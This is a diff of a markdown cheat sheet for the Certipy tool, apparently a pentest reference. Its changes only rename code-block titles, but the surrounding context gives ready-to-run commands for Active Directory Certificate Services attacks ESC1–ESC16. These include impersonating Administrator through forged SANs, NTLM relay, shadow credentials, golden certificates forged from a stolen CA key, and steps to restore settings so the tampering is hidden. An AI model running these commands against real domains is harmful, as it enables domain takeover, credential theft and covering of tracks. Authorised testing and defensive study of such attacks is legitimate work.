@@ -27,7 +27,7 @@ fi
 
 Enumerate ADCS: pulls CA list, templates, ESC1 through ESC15 vulnerabilities, and ACL findings. `-vulnerable -enabled -text` filters to only published templates with known abuse paths, printed as human readable text.
 
-```sh title:"Enumerate vulnerable enabled templates"
+```sh title:"Certipy Enumerate vulnerable enabled templates"
 certipy find -u $user@$domain $auth_flags -dc-ip $rhost_ip -vulnerable -enabled -text
 ```
 <!-- cheat
@@ -42,7 +42,7 @@ import certipy_auth
 
 Request a certificate from the CA. `-upn` lets you set the SAN, which is what ESC1 abuses to impersonate any principal.
 
-```sh title:"Request cert with chosen UPN in SAN"
+```sh title:"Certipy Request cert with chosen UPN in SAN"
 certipy req -u $user@$domain $auth_flags -ca $ca_name -template $template_name -upn $target_upn -dc-ip $rhost_ip
 ```
 <!-- cheat
@@ -60,7 +60,7 @@ var target_upn
 
 PKINIT authenticate with a pfx to get a TGT and NT hash for the cert's principal.
 
-```sh title:"PKINIT with pfx"
+```sh title:"Certipy PKINIT with pfx"
 certipy auth -u $user@$domain $auth_flags -pfx $pfx_file -dc-ip $rhost_ip
 ```
 <!-- cheat
@@ -76,7 +76,7 @@ var pfx_file
 
 Relay captured NTLM auth to the ADCS web endpoint and request a cert on behalf of the coerced principal. Classic ESC8 attack.
 
-```sh title:"ESC8 relay to certsrv"
+```sh title:"Certipy ESC8 relay to certsrv"
 certipy relay -u $user@$domain $auth_flags -target http://$target_adcs/certsrv/certfnsh.asp -template $template_name -dc-ip $rhost_ip
 ```
 <!-- cheat
@@ -93,7 +93,7 @@ var template_name
 
 Write a Key Credential (`msDS-KeyCredentialLink`) on the target and immediately request a PKINIT cert. `shadow auto` chains the whole primitive.
 
-```sh title:"Auto chain KeyCredentialLink write and PKINIT"
+```sh title:"Certipy Auto chain KeyCredentialLink write and PKINIT"
 certipy shadow auto -target $domain -dc-ip $rhost_ip -username $user@$domain $auth_flags -account $target
 ```
 <!-- cheat
@@ -109,7 +109,7 @@ var target
 
 Forge a cert signed by a stolen CA private key. Works offline, survives CA rotation of user passwords, and lets you impersonate any UPN. Requires `CA.pfx` (usually from DPAPI or LSASS on the CA host).
 
-```sh title:"Offline forge signed by stolen CA.pfx, impersonate any UPN"
+```sh title:"Certipy Offline forge signed by stolen CA.pfx, impersonate any UPN"
 certipy forge -ca-pfx $ca_pfx -upn $target_upn -subject $target_subject -dc-ip $rhost_ip -out $output_pfx
 ```
 <!-- cheat
@@ -127,7 +127,7 @@ var output_pfx
 
 Export a certificate template's full configuration to JSON. Keep the output; `-save-old` in ESC4 flows reads from this to restore the template after exploitation.
 
-```sh title:"Export template config JSON"
+```sh title:"Certipy Export template config JSON"
 certipy template -u $user@$domain $auth_flags -template $template_name -dc-ip $rhost_ip -export $template_name.json
 ```
 <!-- cheat
@@ -143,7 +143,7 @@ var template_name
 
 Create a computer account via LDAP (requires MachineAccountQuota > 0). Needed for ESC6/ESC9/ESC10 flows that depend on a controlled machine principal.
 
-```sh title:"Create machine account (MachineAccountQuota > 0)"
+```sh title:"Certipy Create machine account (MachineAccountQuota > 0)"
 certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -add -name $rhost_name -dns $rhost_name
 ```
 <!-- cheat
@@ -159,7 +159,7 @@ var rhost_name
 
 Step 1 of ESC1/ESC2: request a cert from the vulnerable template with `-upn administrator` to put Administrator in the SAN. ESC1 allows arbitrary UPN; ESC2 is any-purpose EKU.
 
-```sh title:"Request cert with administrator in SAN from vulnerable template"
+```sh title:"Certipy Request cert with administrator in SAN from vulnerable template"
 certipy req -u $user@$domain $auth_flags -ca $ca -template $template -upn administrator@$domain -dc-ip $rhost_ip
 ```
 <!-- cheat
@@ -174,7 +174,7 @@ var template
 
 Step 2 of ESC1/ESC2: PKINIT with the cert obtained in step 1 to get Administrator's TGT and NT hash.
 
-```sh title:"PKINIT as administrator using the cert from ESC1/ESC2 step 1"
+```sh title:"Certipy PKINIT as administrator using the cert from ESC1/ESC2 step 1"
 certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
 ```
 <!-- cheat
@@ -186,7 +186,7 @@ import domain_ip
 
 Step 1 of ESC3: request an Enrollment Agent cert from the vulnerable template.
 
-```sh title:"Request Enrollment Agent cert from the vulnerable template"
+```sh title:"Certipy Request Enrollment Agent cert from the vulnerable template"
 certipy req -u $user@$domain $auth_flags -ca $ca -template $template -dc-ip $rhost_ip
 ```
 <!-- cheat
@@ -201,7 +201,7 @@ var template
 
 Step 2 of ESC3: use the Enrollment Agent cert to request a User cert on behalf of Administrator.
 
-```sh title:"Enroll User cert on behalf of administrator with agent.pfx"
+```sh title:"Certipy Enroll User cert on behalf of administrator with agent.pfx"
 certipy req -u $user@$domain $auth_flags -ca $ca -template 'User' -on-behalf-of '$domain\administrator' -pfx agent.pfx
 ```
 <!-- cheat
@@ -215,7 +215,7 @@ var ca
 
 Step 3 of ESC3: PKINIT with the on behalf of cert to get Administrator's TGT and NT hash.
 
-```sh title:"PKINIT as administrator using the on behalf of cert"
+```sh title:"Certipy PKINIT as administrator using the on behalf of cert"
 certipy auth -pfx $pfx -username administrator@$domain -dc-ip $rhost_ip
 ```
 <!-- cheat
@@ -228,7 +228,7 @@ var pfx
 
 Step 1 of ESC4: export the original template config so you can restore it after the attack (`-save-old`).
 
-```sh title:"Export original config via -save-old for post exploit restore"
+```sh title:"Certipy Export original config via -save-old for post exploit restore"
 certipy template -u $user@$domain $auth_flags -template $template -save-old -dc-ip $rhost_ip
 ```
 <!-- cheat
@@ -242,7 +242,7 @@ var template
 
 Step 2 of ESC4: the template was just rewritten to be ESC1 vulnerable; request a cert with administrator UPN.
 
-```sh title:"Request administrator cert against now ESC1-vulnerable template"
+```sh title:"Certipy Request administrator cert against now ESC1-vulnerable template"
 certipy req -u $user@$domain $auth_flags -ca $ca -template $template -upn administrator -dc-ip $rhost_ip
 ```
 <!-- cheat
@@ -257,7 +257,7 @@ var template
 
 Step 3 of ESC4: load the saved JSON back onto the template to hide the tampering.
 
-```sh title:"Restore original template JSON to hide the tampering"
+```sh title:"Certipy Restore original template JSON to hide the tampering"
 certipy template -u $user@$domain $auth_flags -template $template -configuration $template.json
 ```
 <!-- cheat
@@ -271,7 +271,7 @@ var template
 
 ESC5 abuses object ACL misconfigurations on the CA itself (or related PKI objects). After gaining write access to a critical PKI object (NTAuthCertificates, AIA, CA computer object), backing up the CA private key gives forge capability.
 
-```sh title:"Backup CA private key/cert to .pfx (requires CA compromise)"
+```sh title:"Certipy Backup CA private key/cert to .pfx (requires CA compromise)"
 certipy ca -u $user@$domain $auth_flags -target $ca_fqdn -config '$ca_fqdn\$ca_config' -backup
 ```
 <!-- cheat
@@ -286,7 +286,7 @@ var ca_config
 
 Forge a golden certificate from the backed-up CA private key. PKINIT as any principal in the forest.
 
-```sh title:"Forge cert as administrator from compromised CA key"
+```sh title:"Certipy Forge cert as administrator from compromised CA key"
 certipy forge -ca-pfx $ca_pfx -upn administrator@$domain -sid $admin_sid -crl 'ldap:///'
 ```
 <!-- cheat
@@ -300,7 +300,7 @@ var admin_sid
 
 ESC6: the CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set, which lets you supply an arbitrary SAN in any cert request (including default User templates). Same flow as ESC1 but the misconfig lives on the CA, not the template.
 
-```sh title:"Request cert with administrator SAN against EDITF_ATTRIBUTESUBJECTALTNAME2 CA"
+```sh title:"Certipy Request cert with administrator SAN against EDITF_ATTRIBUTESUBJECTALTNAME2 CA"
 certipy req -u $user@$domain $auth_flags -ca $ca -template User -upn administrator@$domain -dc-ip $rhost_ip
 ```
 <!-- cheat
@@ -329,7 +329,7 @@ var ca
 
 ESC7 Step 2: enable the built-in SubCA template (disabled by default) so we can request against it.
 
-```sh title:"Enable SubCA template on the CA"
+```sh title:"Certipy Enable SubCA template on the CA"
 certipy ca -u $user@$domain $auth_flags -target $ca_fqdn -ca $ca -enable-template SubCA
 ```
 <!-- cheat
@@ -344,7 +344,7 @@ var ca
 
 ESC7 Step 3: request SubCA cert with administrator UPN. CA will fail-on-pending; you'll get a request ID to issue manually in the next step.
 
-```sh title:"Submit SubCA cert request with administrator SAN (will pend)"
+```sh title:"Certipy Submit SubCA cert request with administrator SAN (will pend)"
 certipy req -u $user@$domain $auth_flags -ca $ca -template SubCA -upn administrator@$domain -dc-ip $rhost_ip
 ```
 <!-- cheat
@@ -358,7 +358,7 @@ var ca
 
 ESC7 Step 4: as a CA officer, approve the pending request to get the cert issued.
 
-```sh title:"Issue the pending SubCA request as CA officer"
+```sh title:"Certipy Issue the pending SubCA request as CA officer"
 certipy ca -u $user@$domain $auth_flags -target $ca_fqdn -ca $ca -issue-request $request_id
 ```
 <!-- cheat
@@ -374,7 +374,7 @@ var request_id
 
 ESC7 Step 5: pull the issued cert by request ID.
 
-```sh title:"Retrieve issued SubCA cert by request ID"
+```sh title:"Certipy Retrieve issued SubCA cert by request ID"
 certipy ca -u $user@$domain $auth_flags -target $ca_fqdn -ca $ca -retrieve $request_id
 ```
 <!-- cheat
@@ -390,7 +390,7 @@ var request_id
 
 ESC8 (HTTP) / ESC11 (RPC) abuse the CA's web enrollment endpoints accepting NTLM. Start the relay; pair with a coercion technique (PetitPotam, Coercer) to force the DC to authenticate. Use `-template DomainController` when relaying a DC$.
 
-```sh title:"Relay coerced NTLM to AD CS web enrollment (DC template)"
+```sh title:"Certipy Relay coerced NTLM to AD CS web enrollment (DC template)"
 certipy relay -target 'https://$ca_fqdn' -template DomainController
 ```
 <!-- cheat
@@ -402,7 +402,7 @@ var ca_fqdn
 
 Same relay, but for relaying a user account rather than a machine - drop the `-template` arg to use default User template.
 
-```sh title:"Relay coerced NTLM to AD CS web enrollment (User template)"
+```sh title:"Certipy Relay coerced NTLM to AD CS web enrollment (User template)"
 certipy relay -target 'https://$ca_fqdn'
 ```
 <!-- cheat
@@ -414,7 +414,7 @@ var ca_fqdn
 
 ESC9 abuses a template with `CT_FLAG_NO_SECURITY_EXTENSION` (no SID in cert SAN). Step 1: rewrite victim's UPN to administrator (requires GenericWrite or similar on victim).
 
-```sh title:"Rewrite victim UPN to administrator (no SID extension cert template)"
+```sh title:"Certipy Rewrite victim UPN to administrator (no SID extension cert template)"
 certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn administrator -user $victim update
 ```
 <!-- cheat
@@ -428,7 +428,7 @@ var victim
 
 If you don't have the victim's password, set msDS-KeyCredentialLink and PKINIT to grab their TGT/NT.
 
-```sh title:"Add shadow credentials to victim for PKINIT auth"
+```sh title:"Certipy Add shadow credentials to victim for PKINIT auth"
 certipy shadow -u $user@$domain $auth_flags -dc-ip $rhost_ip -account $victim auto
 ```
 <!-- cheat
@@ -442,7 +442,7 @@ var victim
 
 ESC9 Step 2: with victim's Kerberos ticket and the rewritten UPN, request the cert. Cert SAN now claims administrator's UPN but the SID extension is absent, so KDC trusts the UPN.
 
-```sh title:"Request cert as victim against no-SID template (Kerberos)"
+```sh title:"Certipy Request cert as victim against no-SID template (Kerberos)"
 certipy req -k -dc-ip $rhost_ip -target $ca_fqdn -ca $ca -template $template
 ```
 <!-- cheat
@@ -456,7 +456,7 @@ var template
 
 ESC9 Step 3 (cleanup): restore the victim's original UPN to cover tracks.
 
-```sh title:"Restore victim's original UPN after ESC9 abuse"
+```sh title:"Certipy Restore victim's original UPN after ESC9 abuse"
 certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn $victim@$domain -user $victim update
 ```
 <!-- cheat
@@ -470,7 +470,7 @@ var victim
 
 ESC10 abuses weak certificate mapping in StrongCertificateBindingEnforcement registry. Rewrite victim UPN to target a DC machine account (`DC$`), then PKINIT to LDAP shell as that DC.
 
-```sh title:"Rewrite victim UPN to DC$ for ESC10 weak-mapping abuse"
+```sh title:"Certipy Rewrite victim UPN to DC$ for ESC10 weak-mapping abuse"
 certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn '$dc_name$@$domain' -user $victim update
 ```
 <!-- cheat
@@ -485,7 +485,7 @@ var victim
 
 After requesting the cert as the rewritten victim, PKINIT and drop into an LDAP shell as the impersonated DC$ - good for DCSync, RBCD writes, etc.
 
-```sh title:"PKINIT as DC$ and drop into an LDAP shell"
+```sh title:"Certipy PKINIT as DC$ and drop into an LDAP shell"
 certipy auth -pfx $dc_pfx -dc-ip $rhost_ip -ldap-shell
 ```
 <!-- cheat
@@ -497,7 +497,7 @@ var dc_pfx
 
 ESC15: schema v1 templates accept attacker-supplied Application Policies. Request a cert with explicit `Client Authentication` policy + administrator UPN to bypass EKU restrictions.
 
-```sh title:"Inject Client Authentication app policy + admin SAN on schema v1 template"
+```sh title:"Certipy Inject Client Authentication app policy + admin SAN on schema v1 template"
 certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca -template $template -upn administrator@$domain -sid $admin_sid -application-policies 'Client Authentication'
 ```
 <!-- cheat
@@ -514,7 +514,7 @@ var admin_sid
 
 ESC16: the CA has the security SID extension disabled globally (msPKI-Enrollment-Flag `CT_FLAG_NO_SECURITY_EXTENSION` set on the CA). Same flow as ESC9 - rewrite victim UPN, request cert as victim, auth as administrator.
 
-```sh title:"Request cert as victim against ESC16 CA (no SID extension globally)"
+```sh title:"Certipy Request cert as victim against ESC16 CA (no SID extension globally)"
 certipy req -k -dc-ip $rhost_ip -target $ca_fqdn -ca $ca -template User
 ```
 <!-- cheat
